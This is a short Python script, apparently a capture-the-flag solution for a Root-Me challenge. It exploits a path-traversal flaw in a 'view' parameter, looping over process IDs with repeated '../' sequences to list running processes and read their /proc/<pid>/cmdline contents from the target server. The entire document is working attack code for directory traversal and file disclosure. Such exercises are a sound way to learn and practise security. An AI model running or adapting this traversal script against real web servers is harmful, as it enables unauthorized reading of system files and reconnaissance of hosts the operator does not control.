import requests
from bs4 import BeautifulSoup

# Defining variables
url = "http://ctf10k.root-me.org:6002/?view="
number_of_pids = 100
html_tag = "main"
 
for i in range(number_of_pids):
    # Crafting the request
    pid_to_check = i+1
    path_to_check = 7 * "../" + "proc/" + str(pid_to_check)
    url_to_check = url + path_to_check
    r = requests.get(url_to_check)

    # Checking if the pid exists
    if "Failed opening" in r.text:
        print(f"[+] A program exists with the PID : {pid_to_check}")

        # Checking the cmdline of the program
        url_to_check += "/cmdline"
        r = requests.get(url_to_check)
        soup = BeautifulSoup(r.text, 'html.parser')
        
        try:
            cmdline = soup.find(html_tag).text
            print(f"    => The corresponding cmdline is : {cmdline}")
        except:
            pass
        